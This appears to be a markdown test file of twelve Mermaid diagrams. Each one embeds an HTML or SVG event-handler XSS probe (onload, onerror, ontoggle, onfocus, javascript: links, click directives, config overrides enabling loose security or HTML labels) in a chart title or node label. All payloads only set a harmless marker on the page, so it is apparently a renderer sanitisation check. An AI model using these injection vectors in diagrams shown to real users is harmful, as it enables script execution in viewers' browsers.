# Mermaid Event-Handler Escalation

## EH1: svg onload
```mermaid
xychart-beta
    title "<svg onload='document.body.dataset.eh1=1' id=EH1></svg>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH2: svg with animate onbegin
```mermaid
xychart-beta
    title "<svg id=EH2><animate onbegin='document.body.dataset.eh2=1' attributeName=x dur=1s/></svg>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH3: a href javascript
```mermaid
xychart-beta
    title "<a id=EH3 href='javascript:document.body.dataset.eh3=1'>click</a>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH4: details ontoggle open
```mermaid
xychart-beta
    title "<details id=EH4 open ontoggle='document.body.dataset.eh4=1'>x</details>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH5: input autofocus onfocus
```mermaid
xychart-beta
    title "<input id=EH5 autofocus onfocus='document.body.dataset.eh5=1'>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH6: SVG with set/animate href to javascript
```mermaid
xychart-beta
    title "<svg id=EH6><set attributeName=href to='javascript:document.body.dataset.eh6=1'/></svg>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH7: SVG inline script via direct svg
```mermaid
xychart-beta
    title "<svg id=EH7 xmlns='http://www.w3.org/2000/svg'><script>document.body.dataset.eh7=1</script></svg>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH8: img with srcset and onerror
```mermaid
xychart-beta
    title "<img id=EH8 srcset='x 1x' onerror='document.body.dataset.eh8=1'>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH9: video onloadstart
```mermaid
xychart-beta
    title "<video id=EH9 src=q onloadstart='document.body.dataset.eh9=1' autoplay></video>"
    x-axis [a, b]
    y-axis "Y" 0 --> 100
    bar [50, 80]
```

## EH10: Mermaid click directive (modern)
```mermaid
flowchart TD
    A[click me] --> B[result]
    click A "javascript:document.body.dataset.eh10=1"
```

## EH11: Mermaid init securityLevel via metadata
```mermaid
---
config:
    securityLevel: loose
---
flowchart TD
    A[click me] --> B[result]
    click A "javascript:document.body.dataset.eh11=1"
```

## EH12: HTML inside flowchart node label (legacy htmlLabels)
```mermaid
---
config:
    flowchart:
        htmlLabels: true
---
flowchart TD
    A["<img src=q onerror='document.body.dataset.eh12=1' id=EH12>label"]
```
